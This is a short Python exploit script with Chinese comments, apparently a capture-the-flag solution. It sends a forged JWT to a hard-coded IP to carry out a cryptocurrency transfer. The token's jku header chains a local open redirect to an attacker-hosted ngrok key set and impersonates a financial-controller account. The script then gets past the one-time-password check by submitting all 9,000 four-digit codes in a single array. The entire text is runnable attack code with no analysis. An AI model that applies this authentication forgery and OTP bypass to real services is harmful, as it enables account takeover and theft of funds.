import requests

# 伪造的 JWT（通过题解的方法生成）
forged_token = "eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly8xMjcuMC4wLjE6MTMzNy9hcGkvYW5hbHl0aWNzL3JlZGlyZWN0P3JlZj1tYWxpY2lvdXMmdXJsPWh0dHBzOi8vNGYyMTI5NzQ0NWZjLm5ncm9rLWZyZWUuYXBwLy53ZWxsLWtub3duL2p3a3MuanNvbiIsImtpZCI6IjZhN2ZiZjAwLWQ1MTQtNDZmZi1hNmI2LTY1Njg0YTc3NTI4NCIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImZpbmFuY2lhbC1jb250cm9sbGVyQGZyb250aWVyLWJvYXJkLmh0YiIsImlhdCI6MTc1NzU1ODg3OSwiZXhwIjoxNzU3NTgwNDc5fQ.UZobbrK8GyzvVpignugJkcxmuLo0OYXzSX8euUAio90gIQF-ro3L4EwqAwDU90ylK5PvP3XFMPKhjFielHMcPaxm_rmlIUlO4MruNJ6JG0XYt2hPzjXzlwTY8aX4JzeM_Q_AGmMvksGjrnG0oBCdvJ8F3dqPR---g5SPP48TNiOWJUvh8WgYl9owpOB21XnyPRDUaXhfl_swXPoA6rjkOI5Vbcs8tWA2MHC5hz7N6LHBeZVLcAoK1zbYxXdbqLdSCbHLJ9lEc12PwVzHnOCwOWBfIwE6R3dWl2OPvu5oCrw3a0zgNSGxRkAA1545FlXclT61fzv1Y8g7nDsEAyfwEg"

# 生成所有 4 位 OTP
otps = [str(i).zfill(4) for i in range(1000, 10000)]

# 构造交易请求体
transaction_payload = {
    "to": "test@test.com",
    "coin": "CLCR",
    "amount": 28204754713,
    "otp": otps  # 一次性发送所有 OTP
}

# 请求头
headers = {
    "Authorization": f"Bearer {forged_token}",
    "Content-Type": "application/json"
}

# 发送 POST 请求
response = requests.post(
    "http://94.237.122.241:56984/api/crypto/transaction",
    json=transaction_payload,
    headers=headers
)

# 检查结果
if response.status_code == 200:
    print("[+] Transaction successful!")
else:
    print("[-] Transaction failed.")
print(response.text)

